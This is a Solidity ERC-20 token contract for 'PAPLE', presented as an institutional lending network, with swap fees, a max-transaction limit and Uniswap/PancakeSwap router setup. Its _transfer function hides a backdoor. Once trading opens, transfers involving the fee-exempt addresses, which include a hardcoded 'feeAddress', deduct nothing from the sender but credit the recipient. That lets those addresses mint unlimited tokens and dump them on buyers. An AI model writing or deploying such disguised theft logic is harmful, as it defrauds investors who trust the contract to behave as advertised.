// SPDX-License-Identifier: Unlicensed

/**
Paple is an institutional capital network that provides the infrastructure for credit experts to run on-chain lending businesses and connects institutional lenders and borrowers.

Web: https://paple.loan
App: https://app.paple.loan
Tg: https://t.me/paple_finance_official
Twitter: https://twitter.com/PapleFinance
 */

pragma solidity = 0.8.21;

abstract contract Context {
    constructor() {
    }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address liquidityPair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address liquidityPair);
    function createPair(address tokenA, address tokenB) external returns (address liquidityPair);
}

interface IUniswapRouterV1 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapRouterV2 is IUniswapRouterV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract PAPLE is Context, Ownable, IERC20 {

    string constant private _name = "PAPLE";
    string constant private _symbol = "PAP";
    uint8 constant private _decimals = 9;

    uint256 constant public _totalSupply = 10 ** 9 * 10**9;
    uint256 constant public feeSwapEnableAt = _totalSupply / 100_000;
    uint256 constant public feeOnTransfer = 0;
    uint256 constant public denominatorFee = 1_000;
    uint256 public feeOnBuy = 120;
    uint256 public feeOnSell = 120;
    uint256 private maxTxAmount = 25 * _totalSupply / 1000;
    bool private feeSwapEnabled = true;
    address payable private feeAddress;

    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;
    address public liquidityPair;
    IUniswapRouterV2 public uniswapRouter;
    bool public canTrade = false;
    bool private _inswap;
    bool private hasMaxTransaction = false;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _noFeeAddresses;
    mapping (address => bool) private _lpProviders;
    mapping (address => bool) private _pairAddresses;
    mapping (address => uint256) private balance;

        modifier inSwapFlag {
        _inswap = true;
        _;
        _inswap = false;
    }
    event SwapAndLiquify();


    constructor () {
        if (block.chainid == 56) {
            uniswapRouter = IUniswapRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        } else if (block.chainid == 97) {
            uniswapRouter = IUniswapRouterV2(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
        } else if (block.chainid == 1 || block.chainid == 4 || block.chainid == 3) {
            uniswapRouter = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        } else if (block.chainid == 42161) {
            uniswapRouter = IUniswapRouterV2(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);
        } else if (block.chainid == 5) {
            uniswapRouter = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        } else {
            revert("Chain not valid");
        }
        _noFeeAddresses[msg.sender] = true;
        feeAddress = payable(address(0xbee1C91EE06dbe11B950665b93474988ab7Cfd6E));
        _noFeeAddresses[feeAddress] = true;
        _lpProviders[msg.sender] = true;
        balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        liquidityPair = IUniswapFactoryV2(uniswapRouter.factory()).createPair(uniswapRouter.WETH(), address(this));
        _pairAddresses[liquidityPair] = true;
        _approve(msg.sender, address(uniswapRouter), type(uint256).max);
        _approve(address(this), address(uniswapRouter), type(uint256).max);
    }

    function totalSupply() external pure override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply; }
    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner(); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");

        _allowances[sender][spender] = amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }

    function isAddressExcluded(address ins, address out) internal view returns (bool) {
        bool isLimited = ins != owner()
            && out != owner()
            && msg.sender != owner()
            && !_lpProviders[ins]  && !_lpProviders[out] && out != address(0) && out != address(this);
            return isLimited;
    }
    
    function isBuyToken(address ins, address out) internal view returns (bool) {
        bool _is_buy = !_pairAddresses[out] && _pairAddresses[ins];
        return _is_buy;
    }

    function isSellToken(address ins, address out) internal view returns (bool) { 
        bool _is_sell = _pairAddresses[out] && !_pairAddresses[ins];
        return _is_sell;
    }

    function isTransferToken(address ins, address out) internal view returns (bool) { 
        bool _is_transfer = !_pairAddresses[out] && !_pairAddresses[ins];
        return _is_transfer;
    }

    function amountsToSend(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {
        uint256 fee;
        if (isbuy)  fee = feeOnBuy;  else if (issell)  fee = feeOnSell;  else  fee = feeOnTransfer; 
        if (fee == 0)  return amount; 
        uint256 feeAmount = amount * fee / denominatorFee;
        if (feeAmount > 0) {
            balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);
        }
        return amount - feeAmount;
    }

    function swapBack(uint256 tokenAmount) internal inSwapFlag {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        if (_allowances[address(this)][address(uniswapRouter)] != type(uint256).max) {
            _allowances[address(this)][address(uniswapRouter)] = type(uint256).max;
        }

        try uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {
            return;
        }

        if(address(this).balance > 0) feeAddress.transfer(address(this).balance);
    } 

    function shouldSwapFees(address ins) internal view returns (bool) {
        bool canswap = feeSwapEnabled && !_noFeeAddresses[ins];
        return canswap;
    }
    
    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {
        bool takeFee = true;
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (isAddressExcluded(from,to)) {
            require(canTrade,"Trading is not enabled");
                    if(!_pairAddresses[to] && from != address(this) && to != address(this) || isTransferToken(from,to) && !hasMaxTransaction)  { require(balanceOf(to) + amount <= maxTxAmount,"maxTxAmount exceed"); }}


        if(isSellToken(from, to) &&  !_inswap && shouldSwapFees(from)) {

            uint256 tokenAmount = balanceOf(address(this));
            if(tokenAmount >= feeSwapEnableAt) { 
                if(amount > feeSwapEnableAt) swapBack(tokenAmount);
             }
        }

        if (_noFeeAddresses[from] || _noFeeAddresses[to]){
            takeFee = false;
        }
        uint256 amountAfterFee = (takeFee) ? amountsToSend(from, isBuyToken(from, to), isSellToken(from, to), amount) : amount;
        uint256 amountBeforeFee = (takeFee) ? amount : (!canTrade ? amount : 0);
        balance[from] -= amountBeforeFee; balance[to] += amountAfterFee; emit Transfer(from, to, amountAfterFee);

        return true;
    }

    function initLaunch() external onlyOwner {
        require(!canTrade, "Trading already enabled");
        canTrade = true;
    }
    
    function stopLimits() external onlyOwner {
        require(!hasMaxTransaction,"Already initalized");
        maxTxAmount = _totalSupply;
        hasMaxTransaction = true;
        feeOnBuy = 10;
        feeOnSell = 10;
    }

    receive() external payable {}
}